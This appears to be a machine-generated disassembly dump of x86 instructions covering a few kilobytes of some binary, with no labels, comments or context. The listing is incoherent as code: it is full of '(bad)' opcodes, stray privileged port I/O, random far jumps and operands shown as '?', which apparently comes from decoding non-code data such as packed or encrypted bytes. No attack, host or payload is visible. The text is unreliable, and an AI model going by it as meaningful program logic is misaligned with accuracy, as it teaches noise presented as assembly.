  43e9cc:	dec    esi
  43e9cd:	add    eax,0xb484c598
  43e9d2:	fmul   st(6),st
  43e9d4:	lods   eax,DWORD PTR ds:[esi]
  43e9d5:	push   ds
  43e9d6:	retf   0x6bcf
  43e9d9:	inc    ebx
  43e9da:	mov    ecx,0x5ec86dba
  43e9df:	aad    0xe8
  43e9e1:	add    ebp,DWORD PTR [ebp+0x0]
  43e9e4:	ss loope 0x43e9bc
  43e9e7:	mov    ah,0x60
  43e9e9:	cwde   
  43e9ea:	fisubr DWORD PTR [edi+0x2802c86f]
  43e9f0:	cmc    
  43e9f1:	test   DWORD PTR [edi],eax
  43e9f3:	adc    ebx,DWORD PTR [ebp+0x1b]
  43e9f6:	inc    ebx
  43e9f7:	pop    ss
  43e9f8:	cld    
  43e9f9:	in     al,dx
  43e9fa:	mov    edi,ecx
  43e9fc:	imul   edx,eax,0xffffffe2
  43e9ff:	mov    al,0x71
  43ea01:	cwde   
  43ea02:	fisubr DWORD PTR [edx+0x44a1f12]
  43ea08:	ins    BYTE PTR es:[edi],dx
  43ea09:	inc    ebx
  43ea0a:	pop    ecx
  43ea0b:	icebp  
  43ea0c:	pop    ecx
  43ea0d:	cwde   
  43ea0e:	ret    0x51aa
  43ea11:	cwde   
	...
  43ea2e:	add    BYTE PTR [eax],al
  43ea30:	or     ch,BYTE PTR [edi-0xb5afe42]
  43ea36:	inc    edx
  43ea37:	push   ds
  43ea38:	mov    bh,0x85
  43ea3a:	and    BYTE PTR [esi+0x6efffbb2],dh
  43ea40:	add    edx,DWORD PTR [esi]
  43ea42:	pop    edx
  43ea43:	arpl   WORD PTR [edi-0x56],cx
  43ea46:	enter  0xa2b,0x0
  43ea4a:	push   ebp
  43ea4b:	jb     0x43ea87
  43ea4d:	xchg   edx,eax
  43ea4e:	jmp    0x43ea4d
  43ea50:	(bad)  
  43ea51:	fwait
  43ea52:	sti    
  43ea53:	jmp    0xe1886e17
  43ea58:	mov    esi,0x7dd57415
  43ea5d:	mov    ebx,0xbb7d99f7
  43ea62:	sti    
  43ea63:	cdq    
  43ea64:	es out 0x4a,al
  43ea67:	out    0xf0,al
  43ea69:	jnp    0x43ea2a
  43ea6b:	push   ebp
  43ea6c:	adc    eax,0x54c2bfe2
  43ea71:	jns    0x43eab7
  43ea73:	shl    DWORD PTR [ebx+edi*4],1
  43ea76:	sti    
  43ea77:	push   0x6a
  43ea79:	jmp    FWORD PTR es:[ecx+0x72]
  43ea7d:	push   cs
  43ea7e:	call   DWORD PTR [edi+0x34fac301]
  43ea84:	in     eax,dx
  43ea85:	add    DWORD PTR [ebp+edx*4+0x59],0x1a
  43ea8a:	cld    
  43ea8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ea8c:	sub    BYTE PTR [esi],dl
  43ea8e:	cli    
  43ea8f:	sbb    al,0x2d
  43ea91:	jnp    0x43ea6a
  43ea93:	add    DWORD PTR [eax],0x0
	...
  43eab1:	add    BYTE PTR [ebx+0x7c],ch
  43eab4:	cli    
  43eab5:	xchg   BYTE PTR [ebp+0x9d7732a],al
  43eabb:	mov    ebx,?
  43eabd:	jbe    0x43eb39
  43eabf:	and    eax,0x16def4fa
  43eac4:	je     0x43eabb
  43eac6:	icebp  
  43eac7:	mov    eax,DWORD PTR [edi]
  43eac9:	push   ecx
  43eaca:	xor    BYTE PTR [edx+edi*8],dl
  43eacd:	push   esi
  43eace:	xchg   edi,eax
  43eacf:	sub    edx,edi
  43ead1:	aam    0xea
  43ead3:	sbb    BYTE PTR [ebx-0xa0cdf00],cl
  43ead9:	mov    dh,bh
  43eadb:	push   esi
  43eadc:	mov    ebx,0x83e68881
  43eae2:	fsubr  st,st(7)
  43eae4:	dec    edx
  43eae5:	push   edi
  43eae6:	jmp    0x43eb50
  43eae8:	add    cl,BYTE PTR [ebp-0x24d61657]
  43eaee:	or     al,0xfb
  43eaf0:	and    esi,edi
  43eaf2:	or     ecx,DWORD PTR [eax-0xbbe8b46]
  43eaf8:	jae    0x43eaf2
  43eafa:	dec    ebp
  43eafb:	push   edx
  43eafc:	push   es
  43eafd:	jmp    ecx
  43eaff:	call   0xf4b03085
  43eb04:	jae    0x43eb16
  43eb06:	pop    ebx
  43eb07:	cmp    al,BYTE PTR [ebx+0xc]
  43eb0a:	add    al,0x66
  43eb0c:	cld    
  43eb0d:	out    0xd0,eax
  43eb0f:	lock cmc 
  43eb11:	dec    DWORD PTR [ebx+0x6a]
  43eb14:	out    dx,al
  43eb15:	mov    al,BYTE PTR [eax]
	...
  43eb33:	add    BYTE PTR [ebp+eiz*8+0x47],ch
  43eb37:	test   DWORD PTR [ebx-0xc],ebp
  43eb3a:	push   ebp
  43eb3b:	mov    dh,BYTE PTR [edi+0x58]
  43eb3e:	mov    edx,0x8b54fd38
  43eb44:	js     0x43ebc4
  43eb46:	out    0x14,al
  43eb48:	lock cld 
  43eb4a:	call   DWORD PTR [edx+0x43]
  43eb4d:	xchg   edx,esi
  43eb4f:	lea    esi,[ecx-0x1f]
  43eb52:	icebp  
  43eb53:	dec    DWORD PTR [ebx-0xb099db4]
  43eb59:	cld    
  43eb5a:	push   DWORD PTR [edx]
  43eb5c:	jg     0x43eb51
  43eb5e:	adc    esp,DWORD PTR [edi+esi*4]
  43eb61:	cmp    al,0xfa
  43eb63:	inc    edi
  43eb64:	sub    ecx,ebp
  43eb66:	cli    
  43eb67:	push   DWORD PTR [ebx+ebp*2-0x5bf272ab]
  43eb6e:	adc    bh,ah
  43eb70:	mov    edx,0x254eaec1
  43eb75:	fisttp WORD PTR [ebx-0x7e5bf2c1]
  43eb7b:	jmp    0x43eb23
  43eb7d:	leave  
  43eb7e:	sbb    ecx,DWORD PTR [edi-0x66]
  43eb81:	sub    ebp,esi
  43eb83:	adc    BYTE PTR [ebp+0x27],cl
  43eb86:	cmp    DWORD PTR [edi-0x7b7697ff],0xfa1beb79
  43eb90:	(bad)  
  43eb92:	popf   
  43eb93:	sub    BYTE PTR [ebx-0x7],dh
  43eb96:	cmp    BYTE PTR [edi+0x0],0x0
	...
  43ebb5:	add    cl,ah
  43ebb7:	push   edi
  43ebb8:	mov    DWORD PTR [ecx+ebx*2-0x4205e9f5],eax
  43ebbf:	(bad)  
  43ebc0:	imul   ebp,DWORD PTR [eax+0x52],0xc1bf7f19
  43ebc7:	pop    es
  43ebc8:	pop    ss
  43ebc9:	je     0x43ebe0
  43ebcb:	sahf   
  43ebcc:	mov    esi,0x80b3dd03
  43ebd1:	repz xor BYTE PTR [ecx],bh
  43ebd4:	push   ss
  43ebd5:	dec    edi
  43ebd6:	xor    eax,0x22fa16e6
  43ebdb:	pushf  
  43ebdc:	cmp    ecx,DWORD PTR [eax+edx*4+0x12fa184a]
  43ebe3:	(bad)  
  43ebe4:	sub    ebp,DWORD PTR [ebx]
  43ebe6:	xor    al,0x6f
  43ebe8:	push   ss
  43ebe9:	pop    edx
  43ebea:	xchg   edi,eax
  43ebeb:	pop    edx
  43ebec:	mov    edx,0xfe25cfc8
  43ebf1:	push   esp
  43ebf2:	xchg   BYTE PTR [ebp-0x7c],dh
  43ebf5:	jmp    0x43ec28
  43ebf7:	sbb    edi,esi
  43ebf9:	(bad)  
  43ebfa:	cmp    ebp,esi
  43ebfc:	sub    ebx,DWORD PTR [edi+0x65169e09]
  43ec02:	push   cs
  43ec03:	add    BYTE PTR [esi],dl
  43ec05:	ss gs pop ss
  43ec08:	push   edi
  43ec09:	xchg   DWORD PTR [eax+0x50f0dd00],ebp
  43ec0f:	xchg   esp,eax
  43ec10:	fild   WORD PTR [edx+0x49]
  43ec13:	or     dl,ch
  43ec15:	add    ecx,DWORD PTR ds:0xf44e00
	...
  43ec37:	add    bh,cl
  43ec39:	lds    esi,FWORD PTR [eax]
  43ec3b:	add    BYTE PTR ds:0xf2ee900,cl
  43ec41:	inc    edi
  43ec42:	stos   DWORD PTR es:[edi],eax
  43ec43:	sbb    ecx,DWORD PTR [eax-0x14fc17f1]
  43ec49:	add    ah,BYTE PTR [ecx+eax*8+0x6c]
  43ec4d:	mov    al,0x7e
  43ec4f:	add    ebp,ebx
  43ec51:	add    ah,BYTE PTR [ecx-0x602ffd5]
  43ec57:	sbb    ch,al
  43ec59:	fst    QWORD PTR [eax+0x4c585a1]
  43ec5f:	mov    DWORD PTR [ecx+0x471ae32c],ecx
  43ec65:	mov    al,0x6d
  43ec67:	sar    BYTE PTR [edx],0xfd
  43ec6a:	call   0x3947f972
  43ec6f:	mov    ecx,ecx
  43ec71:	and    ebx,DWORD PTR [eax]
  43ec73:	pop    edx
  43ec74:	xchg   edx,eax
  43ec75:	and    BYTE PTR ds:0xe899bf04,ah
  43ec7b:	sub    edx,DWORD PTR [edx-0x7a]
  43ec7e:	test   eax,0x6b088b1a
  43ec83:	sbb    al,BYTE PTR [ecx-0x14bc28fc]
  43ec89:	fisub  WORD PTR [ebx-0x40]
  43ec8c:	jmp    0x82e6:0x832c32af
  43ec93:	sbb    cl,BYTE PTR [esi+0x68f4f33f]
  43ec99:	clc    
  43ec9a:	jmp    DWORD PTR [ebx+0x0]
	...
  43ecb9:	add    ch,cl
  43ecbb:	push   ds
  43ecbc:	gs jmp 0xb957f660
  43ecc2:	mov    esp,0x269ffce
  43ecc7:	sti    
  43ecc8:	cli    
  43ecc9:	fcom   QWORD PTR [esi]
  43eccb:	jl     0x43ed11
  43eccd:	pop    ecx
  43ecce:	jle    0x43ec81
  43ecd0:	xchg   ah,al
  43ecd2:	push   ss
  43ecd3:	sbb    BYTE PTR [esi+0x5a0a04f6],dl
  43ecd9:	xchg   edi,eax
  43ecda:	dec    ecx
  43ecdb:	dec    ebp
  43ecdc:	add    ebp,ecx
  43ecde:	dec    edx
  43ecdf:	cmp    ecx,ebx
  43ece1:	xor    eax,0x2dcb3ad2
  43ece6:	retf   0xcb3a
  43ece9:	mov    esp,0x62501a8b
  43ecee:	inc    esp
  43ecef:	jmp    0x6c00:0xa46a9f86
  43ecf6:	dec    ebp
  43ecf7:	or     DWORD PTR [edi-0x62],ecx
  43ecfa:	mov    eax,ds:0x126acd09
  43ecff:	(bad)  
  43ed00:	jle    0x43ece3
  43ed02:	push   cs
  43ed03:	xchg   ebp,eax
  43ed04:	or     ch,dh
  43ed06:	fadd   st(3),st
  43ed08:	cli    
  43ed09:	bound  edx,QWORD PTR [edx+0x6]
  43ed0c:	mov    eax,ebp
  43ed0e:	pop    ecx
  43ed0f:	dec    esi
  43ed10:	xchg   ah,cl
  43ed12:	bound  ecx,QWORD PTR [ebp-0x7a]
  43ed15:	pop    ss
  43ed16:	and    eax,0x5dd14185
  43ed1b:	mov    esp,0x99fa
	...
  43ed3c:	mov    BYTE PTR [edx+0x7],al
  43ed3f:	sahf   
  43ed40:	dec    ecx
  43ed41:	idiv   BYTE PTR [edi-0x4153dd8e]
  43ed47:	cmp    al,0x88
  43ed49:	sbb    DWORD PTR [eax+0x3a],edx
  43ed4c:	mov    edi,0x8c0086b2
  43ed51:	test   DWORD PTR [ebx-0x4],eax
  43ed54:	pop    edi
  43ed55:	icebp  
  43ed56:	dec    edx
  43ed57:	(bad)  
  43ed58:	sub    eax,ebp
  43ed5a:	cli    
  43ed5b:	jmp    esp
  43ed5d:	add    eax,ebp
  43ed5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ed60:	xor    esp,edi
  43ed62:	cmc    
  43ed63:	mov    eax,DWORD PTR [ecx-0x573b860b]
  43ed69:	mov    ?,WORD PTR [edx+0x4b850875]
  43ed6f:	cld    
  43ed70:	test   ecx,ebx
  43ed72:	mov    edi,?
  43ed74:	jecxz  0x43ed5c
  43ed76:	jns    0x43ed3c
  43ed78:	test   al,0x8e
  43ed7a:	mov    edx,0x537cb875
  43ed7f:	cld    
  43ed80:	inc    DWORD PTR [edx+eax*1+0x5f]
  43ed84:	xor    eax,0x370b02e6
  43ed89:	dec    edx
  43ed8a:	xchg   DWORD PTR [ecx],edx
  43ed8c:	mov    edi,0x375de37c
  43ed91:	jnp    0x43ede6
  43ed93:	or     BYTE PTR [ebx+0x6402bd47],al
  43ed99:	add    DWORD PTR [eax],eax
  43ed9b:	add    BYTE PTR [edi+0x7c],bh
  43ed9e:	jecxz  0x43edfd
	...
  43edbc:	add    BYTE PTR [eax],al
  43edbe:	ja     0x43ed85
  43edc0:	(bad)  
  43edc1:	int3   
  43edc2:	jo     0x43ed89
  43edc4:	(bad)  
  43edc5:	int3   
  43edc6:	stc    
  43edc7:	jp     0x43edaf
  43edc9:	push   ecx
  43edca:	not    DWORD PTR [ecx+0x4d]
  43edcd:	mov    ecx,DWORD PTR [esi+eax*4+0x43]
  43edd1:	cld    
  43edd2:	lahf   
  43edd3:	icebp  
  43edd4:	dec    edx
  43edd5:	(bad)  
  43edd6:	jmp    0x2543e8c2
  43eddb:	add    eax,ebp
  43eddd:	inc    ebp
  43edde:	mov    bl,0xe7
  43ede0:	cmc    
  43ede1:	mov    esi,DWORD PTR [ecx]
  43ede3:	call   0x1b51b261
  43ede8:	mov    ebx,eax
  43edea:	mov    BYTE PTR [esi-0x77],dl
  43eded:	or     bl,BYTE PTR [eax-0xaafe82d]
  43edf3:	inc    esi
  43edf4:	pop    ss
  43edf5:	cli    
  43edf6:	fisub  DWORD PTR [ecx+0x628efbc1]
  43edfc:	cli    
  43edfd:	xchg   ah,bl
  43edff:	xlat   BYTE PTR ds:[ebx]
  43ee00:	and    al,0x7
  43ee02:	push   ss
  43ee03:	sar    DWORD PTR [ecx-0x41],0x40
  43ee07:	add    DWORD PTR es:[ecx+esi*4+0x46],0xc5aa1126
  43ee10:	pop    ss
  43ee11:	xchg   BYTE PTR [eax-0x35],dl
  43ee14:	add    ebx,0x11
  43ee17:	fcomp  DWORD PTR ds:0x79f0060f
  43ee1d:	mov    edi,0x4c813b00
	...
  43ee3e:	add    BYTE PTR [eax],al
  43ee40:	add    DWORD PTR [edi+0x26],0x17f57bf9
  43ee47:	jle    0x43ee92
  43ee49:	and    bh,BYTE PTR [ecx-0x41]
  43ee4c:	loopne 0x43ee78
  43ee4e:	mov    edx,DWORD PTR [ecx+eiz*2-0x6f]
  43ee52:	rol    DWORD PTR [edi],0xba
  43ee55:	xlat   BYTE PTR ds:[ebx]
  43ee56:	and    al,0x17
  43ee58:	push   cs
  43ee59:	jmp    0xe486:0xc21c88b8
  43ee60:	loopne 0x43eebb
  43ee62:	xchg   BYTE PTR [ebp+eax*1-0x2a],dl
  43ee66:	mov    cl,0xc2
  43ee68:	(bad)  
  43ee6a:	(bad)  
  43ee6b:	dec    DWORD PTR ds:0xc0e486e2
  43ee71:	pop    ecx
  43ee72:	inc    edi
  43ee73:	retf   
  43ee74:	dec    ecx
  43ee75:	jmp    0x43edfd
  43ee77:	jmp    0x43ee07
  43ee79:	dec    edx
  43ee7a:	pop    es
  43ee7b:	dec    edi
  43ee7c:	arpl   WORD PTR [eax],ax
  43ee7e:	cmp    cl,BYTE PTR [ebx+0x18237dfa]
  43ee84:	xchg   ebx,eax
  43ee85:	adc    DWORD PTR [eax],edi
  43ee87:	aas    
  43ee88:	dec    ecx
  43ee89:	or     al,0xe8
  43ee8b:	add    ecx,DWORD PTR ds:0xe4539100
  43ee91:	or     edi,DWORD PTR [ecx-0x75]
  43ee94:	shl    BYTE PTR [edi+0x2b],cl
  43ee97:	sbb    BYTE PTR [ebp+0x7f],dh
  43ee9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ee9b:	add    BYTE PTR [edx-0x454e90d8],dl
  43eea1:	test   DWORD PTR [edi],ebp
  43eea3:	xchg   ecx,eax
	...
  43eec0:	add    BYTE PTR [eax],al
  43eec2:	add    al,0x7d
  43eec4:	mov    ds:0x70185d17,eax
  43eec9:	push   ss
  43eeca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43eecb:	or     esp,DWORD PTR [ebp+0x40]
  43eece:	push   cs
  43eecf:	ja     0x43ef01
  43eed1:	mov    edx,DWORD PTR [ecx+0xc]
  43eed4:	dec    edi
  43eed5:	pop    es
  43eed6:	imul   edi,DWORD PTR [esi],0x7e00ce0
  43eedc:	daa    
  43eedd:	and    al,0xa
  43eedf:	test   DWORD PTR [eax-0x7f],0x88e29545
  43eee6:	(bad)  [ebx]
  43eee8:	mov    dh,0x2b
  43eeea:	fmul   QWORD PTR [ecx]
  43eeec:	add    DWORD PTR [edi],edx
  43eeee:	jecxz  0x43ef33
  43eef0:	in     al,0x8a
  43eef2:	push   edx
  43eef3:	ja     0x43eea0
  43eef5:	pop    ss
  43eef6:	jne    0x43eef3
  43eef8:	inc    esp
  43eef9:	inc    edx
  43eefa:	sbb    bh,cl
  43eefc:	cmp    ebx,DWORD PTR [ecx*2+0x550af820]
  43ef03:	test   DWORD PTR [edi+0x237d0490],ebx
  43ef09:	sbb    dl,bl
  43ef0b:	pop    ss
  43ef0c:	sbb    al,0x16
  43ef0e:	daa    
  43ef0f:	or     esp,DWORD PTR [ebp+0x3f]
  43ef12:	push   cs
  43ef13:	ja     0x43ef14
  43ef15:	mov    al,ds:0x50fbc487
  43ef1a:	adc    esp,DWORD PTR [ebp+edi*4+0x1]
  43ef1e:	adc    BYTE PTR [ebp-0xcd15709],dh
  43ef24:	push   es
  43ef25:	mov    cl,0x0
	...
  43ef43:	add    BYTE PTR [ebp-0x6a208bc9],cl
  43ef49:	mov    ebx,0xdd3118fb
  43ef4e:	stc    
  43ef4f:	jle    0x43ef54
  43ef51:	mov    al,bl
  43ef53:	in     eax,dx
  43ef54:	xchg   DWORD PTR [edx-0x7a],eax
  43ef57:	and    al,0x25
  43ef59:	push   0x8426ac08
  43ef5e:	enter  0x10d4,0x7d
  43ef62:	push   esp
  43ef63:	push   ebp
  43ef64:	jl     0x43ef88
  43ef66:	sbb    BYTE PTR [edi+0x3],cl
  43ef69:	push   es
  43ef6a:	jle    0x43ef99
  43ef6c:	mov    ds:0xcd72c781,al
  43ef71:	push   es
  43ef72:	cwde   
  43ef73:	sub    dh,ch
  43ef75:	add    cl,BYTE PTR [ecx]
  43ef77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ef78:	es test al,cl
  43ef7b:	pushf  
  43ef7c:	or     BYTE PTR [ebp+0x44],bh
  43ef7f:	sbb    eax,0x14fc22be
  43ef84:	sbb    eax,DWORD PTR [esi]
  43ef86:	jle    0x43efad
  43ef88:	push   0xffffff81
  43ef8a:	(bad)  
  43ef8b:	jb     0x43efda
  43ef8d:	push   es
  43ef8e:	cwde   
  43ef8f:	sub    BYTE PTR [esi],ch
  43ef91:	sti    
  43ef92:	or     BYTE PTR [esi+esi*8+0x5f74c883],ch
  43ef99:	jnp    0x43efe7
  43ef9b:	in     eax,0x7e
  43ef9d:	and    ah,al
  43ef9f:	fsub   QWORD PTR [eax]
  43efa1:	push   es
  43efa2:	xchg   BYTE PTR [ecx+0x64033e8c],ah
	...
  43efc4:	add    BYTE PTR [eax],al
  43efc6:	(bad)  
  43efc7:	xchg   ebx,eax
  43efc8:	and    BYTE PTR [eax],al
  43efca:	lahf   
  43efcb:	dec    edx
  43efcc:	neg    BYTE PTR [ecx+0x4581d39f]
  43efd2:	sub    al,0x2f
  43efd4:	lock or eax,edi
  43efd7:	mov    ebp,0x5aff18dc
  43efdc:	repnz pop edi
  43efde:	jge    0x43f014
  43efe0:	pop    eax
  43efe1:	mov    DWORD PTR [eax+eax*1],esi
  43efe4:	add    ecx,0x1f
  43efe7:	ja     0x43efcc
  43efe9:	pop    ebp
  43efea:	mov    bh,0x77
  43efec:	inc    ebx
  43efed:	or     bl,bh
  43efef:	push   ecx
  43eff0:	mov    ebp,0xfffde400
  43eff5:	push   DWORD PTR [ebx+0x44]
  43eff8:	(bad)  
  43eff9:	push   DWORD PTR [ebp+edi*8+0x46e58aff]
  43f000:	and    ebp,0xccc6c079
  43f006:	or     BYTE PTR [eax-0x4827333a],bh
  43f00c:	(bad)  
  43f00d:	int3   
  43f00e:	call   0x7210b6ca
  43f013:	js     0x43effb
  43f015:	or     DWORD PTR [eax+0x20],0x49
  43f019:	mov    ecx,DWORD PTR [ecx+0x1]
  43f01c:	dec    esi
  43f01d:	push   edi
  43f01e:	push   DWORD PTR [eax+0x2]
  43f021:	xor    edx,DWORD PTR [edx]
  43f023:	push   esi
  43f024:	cld    
  43f025:	push   ebp
  43f026:	mov    ds:0xc74d50,al
	...
  43f047:	add    BYTE PTR [ecx+0x64fff5f9],dh
  43f04d:	std    
  43f04e:	mov    BYTE PTR [ebp+0x5c],dh
  43f051:	jbe    0x43f0c6
  43f053:	in     al,0xad
  43f055:	js     0x43f039
  43f057:	call   0x3e23fc
  43f05c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f05d:	enter  0x850e,0xd
  43f061:	push   edi
  43f062:	mov    al,BYTE PTR [esi]
  43f064:	retf   0xd0d8
  43f067:	mov    edi,0x86b764de
  43f06c:	xor    ah,ch
  43f06e:	inc    eax
  43f06f:	dec    esi
  43f070:	mov    edx,0xd39173e
  43f075:	pop    ss
  43f076:	xchg   ebp,esi
  43f078:	mov    ds,WORD PTR [edx+0x6]
  43f07b:	xchg   ebp,edx
  43f07d:	(bad)  
  43f07e:	mov    cl,0xdb
  43f080:	test   bl,dh
  43f082:	and    eax,DWORD PTR [edx+ebp*8+0x156dedf1]
  43f089:	cwde   
  43f08a:	pop    ss
  43f08b:	cli    
  43f08c:	ficom  DWORD PTR [esi]
  43f08e:	(bad)  
  43f08f:	outs   dx,BYTE PTR ds:[esi]
  43f090:	add    eax,0x94f3b1a0
  43f095:	sbb    edx,DWORD PTR [esi]
  43f097:	xchg   BYTE PTR [edx+0xd03fa2e],bh
  43f09d:	pop    ss
  43f09e:	test   al,0x0
  43f0a0:	daa    
  43f0a1:	pop    ss
  43f0a2:	adc    edx,DWORD PTR [ecx+ecx*1]
  43f0a5:	jmp    0x43f066
  43f0a7:	dec    DWORD PTR [edi+0x8902da]
	...
  43f0c9:	add    BYTE PTR [eax-0x35],dl
  43f0cc:	jns    0x43f08d
  43f0ce:	sbb    DWORD PTR [ebp+0x22c7c8cf],eax
  43f0d4:	(bad)  
  43f0d5:	dec    DWORD PTR ds:0x920a441e
  43f0db:	repnz (bad) 
  43f0dd:	dec    DWORD PTR ds:0xdff3b99e
  43f0e3:	sbb    edx,edi
  43f0e5:	iret   
  43f0e6:	adc    dl,BYTE PTR [esi+0x165aff1b]
  43f0ec:	daa    
  43f0ed:	push   cs
  43f0ee:	jge    0x43f08d
  43f0f0:	mov    cl,0xdb
  43f0f2:	xchg   esi,eax
  43f0f3:	xchg   ebx,eax
  43f0f4:	push   ss
  43f0f5:	xchg   al,bl
  43f0f7:	call   esp
  43f0f9:	jg     0x43f0c4
  43f0fb:	(bad)  
  43f0fd:	xchg   ecx,eax
  43f0fe:	push   edx
  43f0ff:	je     0x43f12c
  43f101:	sbb    BYTE PTR [ebp+0xd07e83d],cl
  43f107:	add    BYTE PTR [esi+0x35],ah
  43f10a:	sbb    al,ch
  43f10c:	stos   BYTE PTR es:[edi],al
  43f10d:	xchg   esi,eax
  43f10e:	add    al,0x91
  43f110:	in     al,dx
  43f111:	into   
  43f112:	fimul  DWORD PTR [esi+0x14497ce0]
  43f118:	outs   dx,DWORD PTR ds:[esi]
  43f119:	cdq    
  43f11a:	jmp    0x5f14:0x597ce21b
  43f121:	sar    edx,0x7b
  43f124:	and    esp,DWORD PTR [ebx+ecx*4]
  43f127:	adc    ecx,ebp
  43f129:	cwde   
  43f12a:	out    0x7b,al
  43f12c:	lods   eax,DWORD PTR ds:[esi]
  43f12d:	out    dx,eax
	...
  43f14a:	add    BYTE PTR [eax],al
  43f14c:	push   ecx
  43f14d:	adc    BYTE PTR [ebp+0x633f2341],bh
  43f153:	inc    esp
  43f154:	xor    cl,dh
  43f156:	fsincos 
  43f158:	lea    ecx,[ecx]
  43f15a:	in     al,0x7
  43f15c:	or     eax,0x620adb00
  43f161:	cld    
  43f162:	in     al,0x3
  43f164:	or     eax,0xb4dee61b
  43f169:	jnp    0x43f10e
  43f16b:	dec    DWORD PTR [ebx-0x75621f4b]
  43f171:	scas   al,BYTE PTR es:[edi]
  43f172:	xchg   edx,eax
  43f173:	mov    bl,0xdd
  43f175:	pop    ss
  43f176:	cmp    al,0xd1
  43f178:	jp     0x43f181
  43f17a:	gs dec eax
  43f17c:	push   ds
  43f17d:	jge    0x43f1a7
  43f17f:	cdq    
  43f180:	fnstsw WORD PTR [edx-0x4d]
  43f183:	jnp    0xc8fae646
  43f189:	scas   eax,DWORD PTR es:[edi]
  43f18a:	ins    DWORD PTR es:[edi],dx
  43f18b:	leave  
  43f18c:	or     bh,BYTE PTR [ebx-0x1]
  43f18f:	mov    al,ds:0xe54f7e3a
  43f194:	jns    0x43f1a0
  43f196:	int    0x6a
  43f198:	shl    dh,cl
  43f19a:	ss stos BYTE PTR es:[edi],al
  43f19c:	xchg   ebp,eax
  43f19d:	lods   al,BYTE PTR ds:[esi]
  43f19e:	mov    WORD PTR [edx],gs
  43f1a0:	cld    
  43f1a1:	jnp    0x43f162
  43f1a3:	dec    edi
  43f1a4:	inc    ebp
  43f1a5:	jle    0x43f1f3
  43f1a7:	lds    edx,FWORD PTR [esi-0x79]
  43f1aa:	cmp    esi,ecx
  43f1ac:	pop    esi
  43f1ad:	mov    WORD PTR [ecx+ebp*2],ss
	...
  43f1cc:	add    BYTE PTR [eax],al
  43f1ce:	call   0x7ff8:0xa42200fe
  43f1d5:	and    eax,0x140304f9
  43f1da:	push   es
  43f1db:	cmp    BYTE PTR [ebx-0x1f],0x13
  43f1df:	add    dh,BYTE PTR [edi+eiz*8-0x6b]
  43f1e3:	inc    esi
  43f1e4:	jp     0x43f18a
  43f1e6:	sti    
  43f1e7:	stc    
  43f1e8:	cwde   
  43f1e9:	jmp    0x22d5:0x60d2f644
  43f1f0:	push   es
  43f1f1:	stos   DWORD PTR es:[edi],eax
  43f1f2:	inc    ecx
  43f1f3:	lods   al,BYTE PTR ds:[esi]
  43f1f4:	out    0xdc,eax
  43f1f6:	test   al,0x7d
  43f1f8:	inc    esp
  43f1f9:	popa   
  43f1fa:	sar    DWORD PTR [ebx-0x236f1911],0xfa
  43f201:	dec    esi
  43f202:	call   DWORD PTR [ecx+0x12cd720b]
  43f208:	cmp    BYTE PTR [edx+esi*8+0x1fd57df9],ch
  43f20f:	or     bh,dl
  43f211:	(bad)  
  43f212:	lds    ecx,FWORD PTR [edx]
  43f214:	dec    ebp
  43f215:	xchg   ebx,eax
  43f216:	push   cs
  43f217:	or     edx,DWORD PTR [ecx+ecx*8]
  43f21a:	xor    al,dh
  43f21c:	jmp    DWORD PTR [ecx+0x55]
  43f21f:	and    al,BYTE PTR [esi-0x3c79f94c]
  43f225:	add    BYTE PTR [ecx+edx*2+0x58],bl
  43f229:	pop    ebx
  43f22a:	(bad)  
  43f22c:	pop    ebx
  43f22d:	ret    
  43f22e:	test   eax,0x83e685
	...
  43f24f:	add    BYTE PTR [eax+0x1d],al
  43f252:	dec    ecx
  43f253:	mov    edx,ecx
  43f255:	add    edx,DWORD PTR [eax+0x57]
  43f258:	mov    edi,0x4a330676
  43f25d:	gs cld 
  43f25f:	push   ebp
  43f260:	fimul  DWORD PTR [eax+0x49]
  43f263:	(bad)  
  43f264:	jmp    0x2543e850
  43f269:	add    cl,BYTE PTR [ecx+0x7389bc75]
  43f26f:	in     al,0x6d
  43f271:	ins    DWORD PTR es:[edi],dx
  43f272:	loop   0x43f25c
  43f274:	clc    
  43f275:	ss cli 
  43f277:	jmp    DWORD PTR [edi-0x48]
  43f27a:	push   cs
  43f27b:	test   DWORD PTR [eax+ebp*2+0x2b325f01],esi
  43f282:	mov    edx,0x81537633
  43f287:	in     eax,0xf1
  43f289:	mov    edx,0x538c534d
  43f28e:	cmp    eax,DWORD PTR [eax]
  43f290:	mov    ah,0x7c
  43f292:	mov    esi,0x87d43f08
  43f297:	pop    ebp
  43f298:	lock mov BYTE PTR [ebx-0x20],dl
  43f29c:	cmp    esi,ecx
  43f29e:	ins    DWORD PTR es:[edi],dx
  43f29f:	adc    al,dh
  43f2a1:	or     DWORD PTR [edi-0x5],edi
  43f2a4:	push   ebx
  43f2a5:	out    dx,eax
  43f2a6:	cli    
  43f2a7:	call   DWORD PTR [edi+0x9]
  43f2aa:	xchg   DWORD PTR [ebp+0x48],ebx
  43f2ad:	mov    DWORD PTR [ebx-0x8],edx
  43f2b0:	out    dx,eax
  43f2b1:	in     eax,dx
  43f2b2:	bound  eax,QWORD PTR [eax+eax*1]
	...
  43f2d1:	add    BYTE PTR [eax+0x1],ch
  43f2d4:	add    BYTE PTR [edx+0x65],ch
  43f2d7:	arpl   dx,di
  43f2d9:	dec    BYTE PTR ds:0xcecbea04
  43f2df:	push   ss
  43f2e0:	add    ebx,0x9
  43f2e3:	nop
  43f2e4:	ret    0x88fb
  43f2e7:	xlat   BYTE PTR ds:[ebx]
  43f2e8:	xchg   edi,eax
  43f2e9:	mov    bl,0xfe
  43f2eb:	fisttp WORD PTR [ecx+0x3]
  43f2ee:	or     eax,0x4b36fe17
  43f2f3:	push   cs
  43f2f4:	xchg   eax,edi
  43f2f6:	or     eax,0xd086fe17
  43f2fb:	and    dl,BYTE PTR [ebx+ebx*1+0x7eff46e6]
  43f302:	sub    DWORD PTR [edi],edx
  43f304:	(bad)  
  43f305:	jmp    DWORD PTR [esi]
  43f307:	sub    DWORD PTR [ecx+0x48],edi
  43f30a:	or     eax,0x96dba9a2
  43f30f:	retf   
  43f310:	or     eax,DWORD PTR [esi+0x4c7b6b60]
  43f316:	std    
  43f317:	xchg   ecx,eax
  43f318:	shl    ebx,0x8c
  43f31b:	pop    eax
